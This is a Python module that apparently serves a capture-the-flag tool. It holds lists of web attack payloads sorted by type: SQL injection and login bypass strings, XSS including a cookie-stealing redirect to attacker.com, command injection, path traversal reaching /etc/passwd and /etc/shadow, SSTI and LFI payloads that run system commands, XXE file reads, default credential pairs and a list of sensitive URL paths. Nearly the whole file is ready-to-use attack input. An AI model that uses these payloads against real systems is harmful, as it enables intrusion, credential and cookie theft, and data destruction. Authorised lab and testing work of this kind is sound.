"""Common CTF payloads for various vulnerability types."""

PAYLOADS: dict[str, list[str | tuple[str, str]]] = {
    "sqli": [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "' OR 1=1#",
        "admin' #",
        "') OR ('1'='1",
        "' OR ''='",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "\" OR \"1\"=\"1\"--",
        "admin\"--",
        "1; DROP TABLE users--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT 1,2,3--",
        "' AND 1=1 UNION SELECT 1,2,3--",
        "-1' UNION SELECT 1,2,3--",
        "' OR 'x'='x",
        "') OR ('x'='x",
        "1' OR '1'='1",
    ],
    "sqli_auth_bypass": [
        ("admin'--", "anything"),
        ("admin' #", "anything"),
        ("admin'/*", "anything"),
        ("' OR 1=1--", "' OR 1=1--"),
        ("' OR '1'='1", "' OR '1'='1"),
        ("admin", "' OR '1'='1"),
        ("admin", "' OR 1=1--"),
        ("' OR 1=1#", "' OR 1=1#"),
        ("admin' OR '1'='1", "anything"),
        ("-1' OR 1=1--", "anything"),
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "'\"><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<img src=x onerror=alert(document.cookie)>",
        "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
        "'-alert(1)-'",
        "\\'-alert(1)//",
        "</script><script>alert(1)</script>",
        "<img src=\"x\" onerror=\"alert(1)\">",
        "<svg><script>alert(1)</script></svg>",
    ],
    "cmdi": [
        "; ls",
        "| ls",
        "& ls",
        "; ls -la",
        "| ls -la",
        "; cat /flag*",
        "| cat /flag*",
        "; cat /flag.txt",
        "| cat /flag.txt",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "$(cat /flag*)",
        "`cat /flag*`",
        "; id",
        "| id",
        "& id",
        "; whoami",
        "| whoami",
        "; pwd",
        "| pwd",
        "$(id)",
        "`id`",
        "; cat flag.txt",
        "| cat flag.txt",
        "&& cat /flag.txt",
        "|| cat /flag.txt",
        "; find / -name 'flag*' 2>/dev/null",
        "; grep -r 'flag{' / 2>/dev/null",
        "\n ls",
        "\ncat /flag.txt",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "/etc/passwd",
        "....%5c....%5c....%5cetc/passwd",
        "../../../flag.txt",
        "....//....//....//flag.txt",
        "/flag.txt",
        "../../../var/www/flag.txt",
        "..%252f..%252f..%252fetc/passwd",
        "..\\..\\..\\etc\\passwd",
        "..\\..\\..\\flag.txt",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "../../../etc/shadow",
        "../../../home/user/flag.txt",
        "....//....//....//home/user/flag.txt",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "{{config}}",
        "{{config.items()}}",
        "{{self.__class__.__mro__}}",
        "{{''.__class__.__mro__}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{system('id')}}",
        "{{''.__class__.__bases__[0].__subclasses__()}}",
        "{{request.environ}}",
        "{{lipsum.__globals__}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    ],
    "lfi": [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=flag.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "file:///etc/passwd",
        "file:///flag.txt",
        "php://input",
        "data://text/plain,<?php system('id');?>",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
        "expect://id",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "php://filter/read=string.rot13/resource=flag.php",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
    ],
    "auth_bypass": [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "admin123"),
        ("admin", "123456"),
        ("administrator", "administrator"),
        ("root", "root"),
        ("root", "toor"),
        ("guest", "guest"),
        ("user", "user"),
        ("test", "test"),
        ("admin", ""),
        ("", ""),
        ("admin", "Admin123"),
        ("Admin", "Admin"),
    ],
    "sensitive_paths": [
        "/robots.txt",
        "/.git/config",
        "/.git/HEAD",
        "/.env",
        "/admin",
        "/admin/",
        "/administrator",
        "/flag",
        "/flag.txt",
        "/.htaccess",
        "/backup",
        "/backup/",
        "/config.php",
        "/config.php.bak",
        "/debug",
        "/.DS_Store",
        "/server-status",
        "/phpinfo.php",
        "/info.php",
        "/.svn/entries",
        "/WEB-INF/web.xml",
        "/api/",
        "/api/v1/",
        "/swagger.json",
        "/api-docs",
        "/console",
        "/.well-known/",
        "/sitemap.xml",
        "/crossdomain.xml",
        "/admin.php",
        "/login.php",
        "/dashboard",
        "/secret",
        "/private",
        "/hidden",
        "/source",
        "/backup.sql",
        "/dump.sql",
        "/database.sql",
    ],
}


def get_payloads(payload_type: str) -> list[str | tuple[str, str]]:
    """
    Get payloads for a specific vulnerability type.

    Args:
        payload_type: Type of payload (sqli, xss, cmdi, etc.).

    Returns:
        List of payload strings or tuples.
    """
    return PAYLOADS.get(payload_type.lower(), [])


def get_all_payload_types() -> list[str]:
    """
    Get all available payload types.

    Returns:
        List of payload type names.
    """
    return list(PAYLOADS.keys())
